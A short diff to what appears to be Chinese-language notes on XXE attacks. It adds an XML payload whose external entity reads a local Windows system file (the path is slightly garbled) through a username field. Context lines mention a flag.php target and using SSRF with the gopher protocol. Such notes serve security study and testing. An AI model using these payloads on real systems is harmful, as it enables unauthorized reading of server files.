@@ -126,6 +126,16 @@ http://DNS域名/flag.php
 <x>&f;</x>
 ```
 
+ 
+
+```
+<?xml version = "1.0"?>
+<!DOCTYPE ANY[ <!ENTITY admin SYSTEM "file:///C://Windows//win/ini"> ]>
+<user><username>&admin;</username><password> admin</password></user> 
+```
+
+
+
 ### 利用SSRF进行XXE漏洞
 
 使用gopher伪协议
